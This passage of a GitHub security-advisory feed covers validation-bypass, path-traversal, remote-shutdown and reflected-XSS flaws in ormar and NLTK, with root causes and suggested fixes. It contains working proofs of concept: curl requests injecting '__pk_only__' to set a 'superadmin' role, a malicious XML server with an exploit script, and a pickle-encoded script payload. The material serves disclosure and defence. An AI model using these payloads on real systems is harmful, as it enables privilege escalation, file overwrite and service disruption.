        <category label="severity" term="MODERATE"/>
        <published>2026-03-19T17:25:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ormar] ormar Pydantic Validation Bypass via __pk_only__ and __excluded__ Kwargs Injection in Model Constructor]]></title>
        <id>https://github.com/advisories/GHSA-f964-whrq-44h8</id>
        <link href="https://github.com/advisories/GHSA-f964-whrq-44h8"/>
        <updated>2026-03-20T21:35:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Pydantic validation bypass in <code>ormar</code>'s model constructor allows any unauthenticated user to skip <strong>all</strong> field validation — type checks, constraints, <code>@field_validator</code>/<code>@model_validator</code> decorators, choices enforcement, and required-field checks — by injecting <code>"__pk_only__": true</code> into a JSON request body. The unvalidated data is subsequently persisted to the database. This affects the <strong>canonical usage pattern</strong> recommended in ormar's official documentation and examples.</p>
<p>A secondary <code>__excluded__</code> parameter injection uses the same design pattern to selectively nullify arbitrary model fields during construction.</p>
<h3 id="details">Details</h3>
<p><strong>Root cause:</strong> <code>NewBaseModel.__init__</code> (<a href="https://github.com/collerek/ormar/blob/master/ormar/models/newbasemodel.py#L128"><code>ormar/models/newbasemodel.py</code>, line 128</a>) pops <code>__pk_only__</code> directly from user-supplied <code>**kwargs</code> before any validation occurs:</p>
<pre><code class="language-python"># ormar/models/newbasemodel.py, lines 128-142
pk_only = kwargs.pop("__pk_only__", False)      # ← extracted from user kwargs
object.__setattr__(self, "__pk_only__", pk_only)

new_kwargs, through_tmp_dict = self._process_kwargs(kwargs)

if not pk_only:
    # Normal path: full Pydantic validation
    new_kwargs = self.serialize_nested_models_json_fields(new_kwargs)
    self.__pydantic_validator__.validate_python(
        new_kwargs, self_instance=self
    )
else:
    # Bypass path: NO validation at all
    fields_set = {self.ormar_config.pkname}
    values = new_kwargs
    object.__setattr__(self, "__dict__", values)       # raw dict written directly
    object.__setattr__(self, "__pydantic_fields_set__", fields_set)
</code></pre>
<p>The <code>__pk_only__</code> flag was designed as an internal optimization for creating lightweight FK placeholder instances in <a href="https://github.com/collerek/ormar/blob/master/ormar/fields/foreign_key.py#L41"><code>ormar/fields/foreign_key.py</code> (lines 41, 527)</a>. However, because it is extracted from <code>**kwargs</code> via <code>.pop()</code> with a <code>False</code> default, any external caller that passes user-controlled data to the model constructor can inject this flag.</p>
<p><strong>Why the canonical FastAPI + ormar pattern is vulnerable:</strong></p>
<p>Ormar's official example (<a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py#L55"><code>examples/fastapi_quick_start.py</code>, lines 55-58</a>) recommends using ormar models directly as FastAPI request body parameters:</p>
<pre><code class="language-python">@app.post("/items/", response_model=Item)
async def create_item(item: Item):
    await item.save()
    return item
</code></pre>
<p>FastAPI parses the JSON body and calls <code>TypeAdapter.validate_python(body_dict)</code>, which triggers ormar's <code>__init__</code>. The <code>__pk_only__</code> key is popped at line 128 <strong>before</strong> Pydantic's validator inspects the data, so Pydantic never sees it — even <code>extra='forbid'</code> would not prevent this, because the key is already consumed by ormar.</p>
<p>The ormar Pydantic <code>model_config</code> (set in <a href="https://github.com/collerek/ormar/blob/master/ormar/models/helpers/pydantic.py#L108"><code>ormar/models/helpers/pydantic.py</code>, line 108</a>) does not set <code>extra='forbid'</code>, providing no protection even in theory.</p>
<p><strong>What is bypassed when <code>__pk_only__=True</code>:</strong></p>
<ul>
<li>All type coercion and type checking (e.g., string for int field)</li>
<li><code>max_length</code> constraints on String fields</li>
<li><code>choices</code> constraints</li>
<li>All <code>@field_validator</code> and <code>@model_validator</code> decorators</li>
<li><code>nullable=False</code> enforcement at the Pydantic level</li>
<li>Required-field enforcement (only <code>pkname</code> is put in <code>fields_set</code>)</li>
<li><code>serialize_nested_models_json_fields()</code> preprocessing</li>
</ul>
<p><strong>Save path persists unvalidated data to the database:</strong></p>
<p>After construction with <code>pk_only=True</code>, calling <code>.save()</code> (<a href="https://github.com/collerek/ormar/blob/master/ormar/models/model.py#L89"><code>ormar/models/model.py</code>, lines 89-107</a>) reads fields directly from <code>self.__dict__</code> via <code>_extract_model_db_fields()</code>, then executes <code>table.insert().values(**self_fields)</code> — persisting the unvalidated data to the database with no re-validation.</p>
<p><strong>Secondary vulnerability — <code>__excluded__</code> injection:</strong></p>
<p>The same pattern applies to <code>__excluded__</code> at <a href="https://github.com/collerek/ormar/blob/master/ormar/models/newbasemodel.py#L292"><code>ormar/models/newbasemodel.py</code>, line 292</a>:</p>
<pre><code class="language-python">excluded: set[str] = kwargs.pop("__excluded__", set())
</code></pre>
<p>At lines 326-329, fields listed in <code>__excluded__</code> are silently set to <code>None</code>:</p>
<pre><code class="language-python">for field_to_nullify in excluded:
    new_kwargs[field_to_nullify] = None
</code></pre>
<p>An attacker can inject <code>"__excluded__": ["email", "password_hash"]</code> to nullify arbitrary fields during construction.</p>
<p><strong>Affected entry points:</strong></p>
<table>
<thead>
<tr>
<th>Entry Point</th>
<th>Exploitable?</th>
</tr>
</thead>
<tbody><tr>
<td><code>async def create_item(item: Item)</code> (FastAPI route)</td>
<td>Yes</td>
</tr>
<tr>
<td><code>Model.objects.create(**user_dict)</code></td>
<td>Yes</td>
</tr>
<tr>
<td><code>Model(**user_dict)</code></td>
<td>Yes</td>
</tr>
<tr>
<td><code>Model.model_validate(user_dict)</code></td>
<td>Yes</td>
</tr>
</tbody></table>
<h3 id="poc">PoC</h3>
<p><strong>Step 1: Create a FastAPI + ormar application using the canonical pattern from ormar's docs:</strong></p>
<pre><code class="language-python"># app.py
from contextlib import asynccontextmanager
import sqlalchemy
import uvicorn
from fastapi import FastAPI
import ormar

DATABASE_URL = "sqlite+aiosqlite:///test.db"
ormar_base_config = ormar.OrmarConfig(
    database=ormar.DatabaseConnection(DATABASE_URL),
    metadata=sqlalchemy.MetaData(),
)

@asynccontextmanager
async def lifespan(app: FastAPI):
    database_ = app.state.database
    if not database_.is_connected:
        await database_.connect()
    # Create tables
    engine = sqlalchemy.create_engine(DATABASE_URL.replace("+aiosqlite", ""))
    ormar_base_config.metadata.create_all(engine)
    engine.dispose()
    yield
    database_ = app.state.database
    if database_.is_connected:
        await database_.disconnect()

app = FastAPI(lifespan=lifespan)
database = ormar.DatabaseConnection(DATABASE_URL)
app.state.database = database

class User(ormar.Model):
    ormar_config = ormar_base_config.copy(tablename="users")

    id: int = ormar.Integer(primary_key=True)
    name: str = ormar.String(max_length=50)
    email: str = ormar.String(max_length=100)
    role: str = ormar.String(max_length=20, default="user")
    balance: int = ormar.Integer(default=0)

# Canonical ormar pattern from official examples
@app.post("/users/", response_model=User)
async def create_user(user: User):
    await user.save()
    return user

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)
</code></pre>
<p><strong>Step 2: Send a normal request (validation works correctly):</strong></p>
<pre><code class="language-bash"># This correctly rejects — "name" exceeds max_length=50
curl -X POST http://127.0.0.1:8000/users/ \
  -H "Content-Type: application/json" \
  -d '{
    "name": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "email": "user@example.com"
  }'
# Returns: 422 Validation Error
</code></pre>
<p><strong>Step 3: Inject <code>__pk_only__</code> to bypass ALL validation:</strong></p>
<pre><code class="language-bash">curl -X POST http://127.0.0.1:8000/users/ \
  -H "Content-Type: application/json" \
  -d '{
    "__pk_only__": true,
    "name": "",
    "email": "not-an-email",
    "role": "superadmin",
    "balance": -99999
  }'
# Returns: 200 OK — all fields persisted to database WITHOUT validation
# - "name" is empty despite being required
# - "email" is not a valid email
# - "role" is "superadmin" (bypassing any validator that restricts to "user"/"admin")
# - "balance" is negative (bypassing any ge=0 constraint)
</code></pre>
<p><strong>Step 4: Inject <code>__excluded__</code> to nullify arbitrary fields:</strong></p>
<pre><code class="language-bash">curl -X POST http://127.0.0.1:8000/users/ \
  -H "Content-Type: application/json" \
  -d '{
    "__excluded__": ["email", "role"],
    "name": "attacker",
    "email": "will-be-nullified@example.com",
    "role": "will-be-nullified"
  }'
# Returns: 200 OK — email and role are set to NULL regardless of input
</code></pre>
<h3 id="impact">Impact</h3>
<p><strong>Who is impacted:</strong> Every application using ormar's canonical FastAPI integration pattern (<code>async def endpoint(item: OrmarModel)</code>) is vulnerable. This is the primary usage pattern documented in ormar's official examples and documentation.</p>
<p><strong>Vulnerability type:</strong> Complete Pydantic validation bypass.</p>
<p><strong>Impact scenarios:</strong></p>
<ul>
<li><strong>Privilege escalation</strong>: If a model has a <code>role</code> or <code>is_admin</code> field with a Pydantic validator restricting values to <code>"user"</code>, an attacker can set <code>role="superadmin"</code> by bypassing the validator</li>
<li><strong>Data integrity violation</strong>: Type constraints (<code>max_length</code>, <code>ge</code>/<code>le</code>, regex patterns) are all bypassed — invalid data is persisted to the database</li>
<li><strong>Business logic bypass</strong>: Custom <code>@field_validator</code> and <code>@model_validator</code> decorators (e.g., enforcing email format, age ranges, cross-field dependencies) are entirely skipped</li>
<li><strong>Field nullification</strong> (via <code>__excluded__</code>): Audit fields, tracking fields, or required business fields can be selectively set to NULL</li>
</ul>
<p><strong>Suggested fix:</strong></p>
<p>Replace <code>kwargs.pop("__pk_only__", False)</code> with a keyword-only parameter that cannot be injected via <code>**kwargs</code>:</p>
<pre><code class="language-python"># Before (vulnerable)
def __init__(self, *args: Any, **kwargs: Any) -&gt; None:
    ...
    pk_only = kwargs.pop("__pk_only__", False)

# After (secure)
def __init__(self, *args: Any, _pk_only: bool = False, **kwargs: Any) -&gt; None:
    ...
    object.__setattr__(self, "__pk_only__", _pk_only)
</code></pre>
<p>Apply the same fix to <code>__excluded__</code>:</p>
<pre><code class="language-python"># Before (vulnerable)
excluded: set[str] = kwargs.pop("__excluded__", set())

# After (secure) — pass via keyword-only _excluded parameter
def __init__(self, *args: Any, _pk_only: bool = False, _excluded: set | None = None, **kwargs: Any) -&gt; None:
    ...
    # In _process_kwargs:
    excludes = _excluded or set()
</code></pre>
<p>Internal callers in <code>foreign_key.py</code> would pass <code>_pk_only=True</code> as a named argument. Keyword-only parameters prefixed with <code>_</code> cannot be injected via JSON body deserialization or <code>Model(**user_dict)</code> unpacking.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ormar-orm/ormar/security/advisories/GHSA-f964-whrq-44h8">https://github.com/ormar-orm/ormar/security/advisories/GHSA-f964-whrq-44h8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27953">https://nvd.nist.gov/vuln/detail/CVE-2026-27953</a></li>
<li><a href="https://github.com/ormar-orm/ormar/commit/7f22aa21a7614b993970345b392dabb0ccde0ab3">https://github.com/ormar-orm/ormar/commit/7f22aa21a7614b993970345b392dabb0ccde0ab3</a></li>
<li><a href="https://github.com/ormar-orm/ormar/blob/master/examples/fastapi_quick_start.py#L55">https://github.com/ormar-orm/ormar/blob/master/examples/fastapi_quick_start.py#L55</a></li>
<li><a href="https://github.com/ormar-orm/ormar/blob/master/ormar/fields/foreign_key.py#L41">https://github.com/ormar-orm/ormar/blob/master/ormar/fields/foreign_key.py#L41</a></li>
<li><a href="https://github.com/ormar-orm/ormar/blob/master/ormar/models/helpers/pydantic.py#L108">https://github.com/ormar-orm/ormar/blob/master/ormar/models/helpers/pydantic.py#L108</a></li>
<li><a href="https://github.com/ormar-orm/ormar/blob/master/ormar/models/model.py#L89">https://github.com/ormar-orm/ormar/blob/master/ormar/models/model.py#L89</a></li>
<li><a href="https://github.com/ormar-orm/ormar/blob/master/ormar/models/newbasemodel.py#L128">https://github.com/ormar-orm/ormar/blob/master/ormar/models/newbasemodel.py#L128</a></li>
<li><a href="https://github.com/ormar-orm/ormar/blob/master/ormar/models/newbasemodel.py#L292">https://github.com/ormar-orm/ormar/blob/master/ormar/models/newbasemodel.py#L292</a></li>
<li><a href="https://github.com/ormar-orm/ormar/releases/tag/0.23.1">https://github.com/ormar-orm/ormar/releases/tag/0.23.1</a></li>
<li><a href="https://github.com/advisories/GHSA-f964-whrq-44h8">https://github.com/advisories/GHSA-f964-whrq-44h8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f964-whrq-44h8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T16:27:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] NLTK has a Downloader Path Traversal Vulnerability (AFO) - Arbitrary File Overwrite]]></title>
        <id>https://github.com/advisories/GHSA-469j-vmhf-r6v7</id>
        <link href="https://github.com/advisories/GHSA-469j-vmhf-r6v7"/>
        <updated>2026-03-19T12:42:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>The NLTK downloader does not validate the <code>subdir</code> and <code>id</code> attributes when processing remote XML index files. Attackers can control a remote XML index server to provide malicious values containing path traversal sequences (such as <code>../</code>), which can lead to:</p>
<ol>
<li><strong>Arbitrary Directory Creation</strong>: Create directories at arbitrary locations in the file system</li>
<li><strong>Arbitrary File Creation</strong>: Create arbitrary files</li>
<li><strong>Arbitrary File Overwrite</strong>: Overwrite critical system files (such as <code>/etc/passwd</code>, <code>~/.ssh/authorized_keys</code>, etc.)</li>
</ol>
<h2 id="vulnerability-principle">Vulnerability Principle</h2>
<h3 id="key-code-locations">Key Code Locations</h3>
<p><strong>1. XML Parsing Without Validation</strong> (<code>nltk/downloader.py:253</code>)</p>
<pre><code class="language-python">self.filename = os.path.join(subdir, id + ext)
</code></pre>
<ul>
<li><code>subdir</code> and <code>id</code> are directly from XML attributes without any validation</li>
</ul>
<p><strong>2. Path Construction Without Checks</strong> (<code>nltk/downloader.py:679</code>)</p>
<pre><code class="language-python">filepath = os.path.join(download_dir, info.filename)
</code></pre>
<ul>
<li>Directly uses <code>filename</code> which may contain path traversal</li>
</ul>
<p><strong>3. Unrestricted Directory Creation</strong> (<code>nltk/downloader.py:687</code>)</p>
<pre><code class="language-python">os.makedirs(os.path.join(download_dir, info.subdir), exist_ok=True)
</code></pre>
<ul>
<li>Can create arbitrary directories outside the download directory</li>
</ul>
<p><strong>4. File Writing Without Protection</strong> (<code>nltk/downloader.py:695</code>)</p>
<pre><code class="language-python">with open(filepath, "wb") as outfile:
</code></pre>
<ul>
<li>Can write to arbitrary locations in the file system</li>
</ul>
<h3 id="attack-chain">Attack Chain</h3>
<pre><code>1. Attacker controls remote XML index server
   ↓
2. Provides malicious XML: &lt;package id="passwd" subdir="../../etc" .../&gt;
   ↓
3. Victim executes: downloader.download('passwd')
   ↓
4. Package.fromxml() creates object, filename = "../../etc/passwd.zip"
   ↓
5. _download_package() constructs path: download_dir + "../../etc/passwd.zip"
   ↓
6. os.makedirs() creates directory: download_dir + "../../etc"
   ↓
7. open(filepath, "wb") writes file to /etc/passwd.zip
   ↓
8. System file is overwritten!
</code></pre>
<h2 id="impact-scope">Impact Scope</h2>
<ol>
<li><strong>System File Overwrite</strong></li>
</ol>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<h3 id="environment-setup">Environment Setup</h3>
<ol>
<li>Install NLTK</li>
</ol>
<pre><code class="language-bash">pip install nltk
</code></pre>
<ol start="2">
<li>Prepare malicious server and exploit script (see PoC section)</li>
</ol>
<h3 id="reproduction-process">Reproduction Process</h3>
<p><strong>Step 1: Start malicious server</strong></p>
<pre><code class="language-bash">python3 malicious_server.py
</code></pre>
<p><strong>Step 2: Run exploit script</strong></p>
<pre><code class="language-bash">python3 exploit_vulnerability.py
</code></pre>
<p><strong>Step 3: Verify results</strong></p>
<pre><code class="language-bash">ls -la /tmp/test_file.zip
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="malicious-server-malicious_serverpy">Malicious Server (malicious_server.py)</h3>
<pre><code class="language-python">#!/usr/bin/env python3
"""Malicious HTTP Server - Provides XML index with path traversal"""
import os
import tempfile
import zipfile
from http.server import HTTPServer, BaseHTTPRequestHandler

# Create temporary directory
server_dir = tempfile.mkdtemp(prefix="nltk_malicious_")

# Create malicious XML (contains path traversal)
malicious_xml = """&lt;?xml version="1.0"?&gt;
&lt;nltk_data&gt;
  &lt;packages&gt;
    &lt;package id="test_file" subdir="../../../../../../../../../tmp" 
             url="http://127.0.0.1:8888/test.zip" 
             size="100" unzipped_size="100" unzip="0"/&gt;
  &lt;/packages&gt;
&lt;/nltk_data&gt;
"""

# Save files
with open(os.path.join(server_dir, "malicious_index.xml"), "w") as f:
    f.write(malicious_xml)

with zipfile.ZipFile(os.path.join(server_dir, "test.zip"), "w") as zf:
    zf.writestr("test.txt", "Path traversal attack!")

# HTTP Handler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/malicious_index.xml':
            self.send_response(200)
            self.send_header('Content-type', 'application/xml')
            self.end_headers()
            with open(os.path.join(server_dir, 'malicious_index.xml'), 'rb') as f:
                self.wfile.write(f.read())
        elif self.path == '/test.zip':
            self.send_response(200)
            self.send_header('Content-type', 'application/zip')
            self.end_headers()
            with open(os.path.join(server_dir, 'test.zip'), 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

# Start server
if __name__ == "__main__":
    port = 8888
    server = HTTPServer(("0.0.0.0", port), Handler)
    print(f"Malicious server started: http://127.0.0.1:{port}/malicious_index.xml")
    print("Press Ctrl+C to stop")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped")
</code></pre>
<h3 id="exploit-script-exploit_vulnerabilitypy">Exploit Script (exploit_vulnerability.py)</h3>
<pre><code class="language-python">#!/usr/bin/env python3
"""AFO Vulnerability Exploit Script"""
import os
import tempfile

def exploit(server_url="http://127.0.0.1:8888/malicious_index.xml"):
    download_dir = tempfile.mkdtemp(prefix="nltk_exploit_")
    print(f"Download directory: {download_dir}")
    
    # Exploit vulnerability
    from nltk.downloader import Downloader
    downloader = Downloader(server_index_url=server_url, download_dir=download_dir)
    downloader.download("test_file", quiet=True)
    
    # Check results
    expected_path = "/tmp/test_file.zip"
    if os.path.exists(expected_path):
        print(f"\n✗ Exploit successful! File written to: {expected_path}")
        print(f"✗ Path traversal attack successful!")
    else:
        print(f"\n? File not found, download may have failed")

if __name__ == "__main__":
    exploit()
</code></pre>
<h3 id="execution-results">Execution Results</h3>
<pre><code>✗ Exploit successful! File written to: /tmp/test_file.zip
✗ Path traversal attack successful!
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-469j-vmhf-r6v7">https://github.com/nltk/nltk/security/advisories/GHSA-469j-vmhf-r6v7</a></li>
<li><a href="https://github.com/advisories/GHSA-469j-vmhf-r6v7">https://github.com/advisories/GHSA-469j-vmhf-r6v7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-469j-vmhf-r6v7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T12:42:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] Unauthenticated remote shutdown in nltk.app.wordnet_app]]></title>
        <id>https://github.com/advisories/GHSA-jm6w-m3j8-898g</id>
        <link href="https://github.com/advisories/GHSA-jm6w-m3j8-898g"/>
        <updated>2026-03-19T12:42:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>nltk.app.wordnet_app</code> allows unauthenticated remote shutdown of the local WordNet Browser HTTP server when it is started in its default mode. A simple <code>GET /SHUTDOWN%20THE%20SERVER</code> request causes the process to terminate immediately via <code>os._exit(0)</code>, resulting in a denial of service.</p>
<h3 id="details">Details</h3>
<p>The vulnerable logic is in <code>nltk/app/wordnet_app.py</code>:</p>
<ul>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L242"><code>nltk/app/wordnet_app.py:242</code></a></p>
<ul>
<li>The server listens on all interfaces:</li>
<li><code>server = HTTPServer(("", port), MyServerHandler)</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L87"><code>nltk/app/wordnet_app.py:87</code></a></p>
<ul>
<li>Incoming requests are checked for the exact path:</li>
<li><code>if unquote_plus(sp) == "SHUTDOWN THE SERVER":</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L88"><code>nltk/app/wordnet_app.py:88</code></a></p>
<ul>
<li>The shutdown protection only depends on <code>server_mode</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L93"><code>nltk/app/wordnet_app.py:93</code></a></p>
<ul>
<li>In the default mode (<code>runBrowser=True</code>, therefore <code>server_mode=False</code>), the handler terminates the process directly:</li>
<li><code>os._exit(0)</code></li>
</ul>
</li>
</ul>
<p>This means any party that can reach the listening port can stop the service with a single unauthenticated GET request when the browser is started in its normal mode.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Start the WordNet Browser in Docker in its default mode:</li>
</ol>
<pre><code class="language-bash">docker run -d --name nltk-wordnet-web-default-retest -p 8004:8004 \
  nltk-sandbox \
  python -c "import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8004, True)"
</code></pre>
<ol start="2">
<li>Confirm the service is reachable:</li>
</ol>
<pre><code class="language-bash">curl -s -o /tmp/wn_before.html -w '%{http_code}\n' 'http://127.0.0.1:8004/'
</code></pre>
<p>Observed result:</p>
<pre><code class="language-text">200
</code></pre>
<ol start="3">
<li>Trigger shutdown:</li>
</ol>
<pre><code class="language-bash">curl -s -o /tmp/wn_shutdown.html -w '%{http_code}\n' 'http://127.0.0.1:8004/SHUTDOWN%20THE%20SERVER'
</code></pre>
<p>Observed result:</p>
<pre><code class="language-text">000
</code></pre>
<ol start="4">
<li>Verify the service is no longer available:</li>
</ol>
<pre><code class="language-bash">curl -s -o /tmp/wn_after.html -w '%{http_code}\n' 'http://127.0.0.1:8004/'
docker ps -a --filter name=nltk-wordnet-web-default-retest --format '{{.Names}}\t{{.Status}}'
docker logs nltk-wordnet-web-default-retest
</code></pre>
<p>Observed results:</p>
<pre><code class="language-text">000
nltk-wordnet-web-default-retest    Exited (0)
Server shutting down!
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an unauthenticated denial-of-service issue in the NLTK WordNet Browser HTTP server.</p>
<p>Any reachable client can terminate the service remotely when the application is started in its default mode. The impact is limited to service availability, but it is still security-relevant because:</p>
<ul>
<li>the route is accessible over HTTP</li>
<li>no authentication or CSRF-style confirmation is required</li>
<li>the server listens on all interfaces by default</li>
<li>the process exits immediately instead of performing a controlled shutdown</li>
</ul>
<p>This primarily affects users who run <code>nltk.app.wordnet_app</code> and expose or otherwise allow access to its listening port.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-jm6w-m3j8-898g">https://github.com/nltk/nltk/security/advisories/GHSA-jm6w-m3j8-898g</a></li>
<li><a href="https://github.com/advisories/GHSA-jm6w-m3j8-898g">https://github.com/advisories/GHSA-jm6w-m3j8-898g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jm6w-m3j8-898g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T12:42:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in nltk]]></title>
        <id>https://github.com/advisories/GHSA-gfwx-w7gr-fvh7</id>
        <link href="https://github.com/advisories/GHSA-gfwx-w7gr-fvh7"/>
        <updated>2026-03-19T06:51:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>nltk.app.wordnet_app</code> contains a reflected cross-site scripting issue in the <code>lookup_...</code> route. A crafted <code>lookup_&lt;payload&gt;</code> URL can inject arbitrary HTML/JavaScript into the response page because attacker-controlled <code>word</code> data is reflected into HTML without escaping. This impacts users running the local WordNet Browser server and can lead to script execution in the browser origin of that application.</p>
<h3 id="details">Details</h3>
<p>The vulnerable flow is in <code>nltk/app/wordnet_app.py</code>:</p>
<ul>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L144"><code>nltk/app/wordnet_app.py:144</code></a></p>
<ul>
<li>Requests starting with <code>lookup_</code> are handled as HTML responses:</li>
<li><code>page, word = page_from_href(sp)</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L755"><code>nltk/app/wordnet_app.py:755</code></a></p>
<ul>
<li><code>page_from_href()</code> calls <code>page_from_reference(Reference.decode(href))</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L769"><code>nltk/app/wordnet_app.py:769</code></a></p>
<ul>
<li><code>word = href.word</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L796"><code>nltk/app/wordnet_app.py:796</code></a></p>
<ul>
<li>If no results are found, <code>word</code> is inserted directly into the HTML body:</li>
<li><code>body = "The word or words '%s' were not found in the dictionary." % word</code></li>
</ul>
</li>
</ul>
<p>This is inconsistent with the <code>search</code> route, which does escape user input:</p>
<ul>
<li><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L136"><code>nltk/app/wordnet_app.py:136</code></a><ul>
<li><code>word = html.escape(...)</code></li>
</ul>
</li>
</ul>
<p>As a result, a malicious <code>lookup_...</code> payload can inject script into the response page.</p>
<p>The issue is exploitable because:</p>
<ul>
<li><code>Reference.decode()</code> accepts attacker-controlled base64-encoded pickle data for the URL state.</li>
<li>The decoded <code>word</code> is reflected into HTML without <code>html.escape()</code>.</li>
<li>The server is started with <code>HTTPServer(("", port), MyServerHandler)</code>, so it listens on all interfaces by default, not just <code>localhost</code>.</li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Start the WordNet Browser in an isolated Docker environment:</li>
</ol>
<pre><code class="language-bash">docker run -d --name nltk-wordnet-web -p 8002:8002 \
  nltk-sandbox \
  python -c "import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8002, False)"
</code></pre>
<ol start="2">
<li>Use the following crafted payload, which decodes to:</li>
</ol>
<pre><code class="language-python">("&lt;script&gt;alert(1)&lt;/script&gt;", {})
</code></pre>
<p>Encoded payload:</p>
<pre><code class="language-text">gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4=
</code></pre>
<ol start="3">
<li>Request the vulnerable route:</li>
</ol>
<pre><code class="language-bash">curl -s "http://127.0.0.1:8002/lookup_gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4="
</code></pre>
<ol start="4">
<li>Observed result:</li>
</ol>
<pre><code class="language-text">The word or words '&lt;script&gt;alert(1)&lt;/script&gt;' were not found in the dictionary.
</code></pre>
<img width="867" height="208" alt="127" src="https://github.com/user-attachments/assets/ec09da08-09bc-4fc4-bfc1-c4489e9adaf6">


<p>I also validated the issue directly at function level in Docker:</p>
<pre><code class="language-python">import base64
import pickle

from nltk.app.wordnet_app import page_from_href

payload = base64.urlsafe_b64encode(
    pickle.dumps(("&lt;script&gt;alert(1)&lt;/script&gt;", {}), -1)
).decode()

page, word = page_from_href(payload)
print(word)
print("&lt;script&gt;alert(1)&lt;/script&gt;" in page)
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">WORD= &lt;script&gt;alert(1)&lt;/script&gt;
HAS_SCRIPT= True
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a reflected XSS issue in the NLTK WordNet Browser web UI.</p>
<p>An attacker who can convince a user to open a crafted <code>lookup_...</code> URL can execute arbitrary JavaScript in the origin of the local WordNet Browser application. This can be used to:</p>
<ul>
<li>run arbitrary script in the browser tab</li>
<li>manipulate the page content shown to the user</li>
<li>issue same-origin requests to other WordNet Browser routes</li>
<li>potentially trigger available UI actions in that local app context</li>
</ul>
<p>This primarily impacts users who run <code>nltk.app.wordnet_app</code> as a local or self-hosted HTTP service and open attacker-controlled links.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-gfwx-w7gr-fvh7">https://github.com/nltk/nltk/security/advisories/GHSA-gfwx-w7gr-fvh7</a></li>
<li><a href="https://github.com/nltk/nltk/commit/1c3f799607eeb088cab2491dcf806ae83c29ad8f">https://github.com/nltk/nltk/commit/1c3f799607eeb088cab2491dcf806ae83c29ad8f</a></li>
<li><a href="https://github.com/advisories/GHSA-gfwx-w7gr-fvh7">https://github.com/advisories/GHSA-gfwx-w7gr-fvh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gfwx-w7gr-fvh7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T20:23:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[justhtml] JustHTML has a Sanitizer Bypass (in Markdown)]]></title>
        <id>https://github.com/advisories/GHSA-3rcm-vjrc-p45j</id>
        <link href="https://github.com/advisories/GHSA-3rcm-vjrc-p45j"/>
        <updated>2026-03-18T20:19:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>to_markdown()</code> does not sufficiently escape text content that looks like HTML. As a result, untrusted input that is safe in <code>to_html()</code> can become raw HTML in Markdown output.</p>
